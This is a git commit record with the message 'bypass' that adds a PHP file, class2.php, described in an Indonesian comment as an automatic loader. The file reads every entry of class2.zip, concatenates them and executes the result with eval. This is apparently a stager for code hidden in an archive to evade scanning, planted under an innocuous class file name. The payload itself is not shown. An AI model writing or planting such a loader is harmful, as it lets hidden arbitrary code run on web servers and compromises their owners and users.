daf17632bc2b7a6c8b69e2505db45db0b1a60084
ommauiphone <ommauiphone426@gmail.com>
2025-10-06 04:05:35 +0700

    bypass
    bypass

---
+++ class2.php
@@ -0,0 +1,14 @@
+<?php
+// Loader otomatis untuk menggabungkan & mengeksekusi file-file dari ZIP
+$zip = new ZipArchive;
+if ($zip->open('class2.zip') === TRUE) {
+    $script = '';
+    for ($i = 0; $i < $zip->numFiles; $i++) {
+        $script .= $zip->getFromIndex($i);
+    }
+    eval('?>'.$script);
+    $zip->close();
+} else {
+    echo 'Gagal membuka arsip ZIP';
+}
+?>
